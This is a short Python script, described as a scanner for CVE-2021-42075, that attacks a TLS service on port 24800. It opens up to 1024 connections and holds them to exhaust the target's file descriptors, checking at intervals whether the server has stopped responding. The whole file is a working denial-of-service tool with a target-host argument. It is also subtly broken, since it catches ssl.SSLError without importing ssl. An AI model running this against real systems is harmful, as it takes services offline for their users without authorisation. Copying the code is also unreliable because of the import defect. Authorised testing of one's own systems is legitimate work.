#!/usr/bin/env python3
"""
CVE-2021-42075: File Descriptor Exhaustion Scanner
Tests for file descriptor leak vulnerability leading to DoS
"""

import socket
import time
from utils import create_ssl_context, normalize_host

def scan(host, port=24800, max_connections=1024):
    """Test for CVE-2021-42075 file descriptor exhaustion"""
    host = normalize_host(host)
    context = create_ssl_context()
    
    print(f"\nTesting CVE-2021-42075 - FD exhaustion with {max_connections} connections...")
    
    connections = []
    try:
        for i in range(max_connections):
            try:
                sock = socket.create_connection((host, port), timeout=1.0)
                ssl_sock = context.wrap_socket(sock, server_hostname=host)
                connections.append(ssl_sock)
                if i % 100 == 0:
                    print(f"Opened {i} connections")
                    
                if i > 0 and i % 200 == 0:
                    try:
                        test_sock = socket.create_connection((host, port), timeout=1.0)
                        with context.wrap_socket(test_sock, server_hostname=host) as test_ssl:
                            test_ssl.close()
                    except (socket.error, ssl.SSLError) as e:
                        print(f"[!] WARNING: Server became unresponsive after {i} connections: {e}")
                        break
                
            except (socket.error, ssl.SSLError) as e:
                print(f"[!] WARNING: CVE-2021-42075 - Server failed after {i} connections: {e}")
                if "too many open files" in str(e).lower():
                    print("[!] WARNING: Local file descriptor limit reached")
                break
            
            time.sleep(0.01)
            
    finally:
        print(f"\nClosing {len(connections)} connections...")
        for c in connections:
            try:
                c.close()
            except:
                pass
        print("All connections closed")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='CVE-2021-42075 File Descriptor Exhaustion Scanner')
    parser.add_argument('--host', required=True, help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=24800, help='Target port (default: 24800)')
    parser.add_argument('--max-connections', type=int, default=1024, 
                        help='Maximum number of connections to try (default: 1024)')
    args = parser.parse_args()
    
    scan(args.host, args.port, args.max_connections)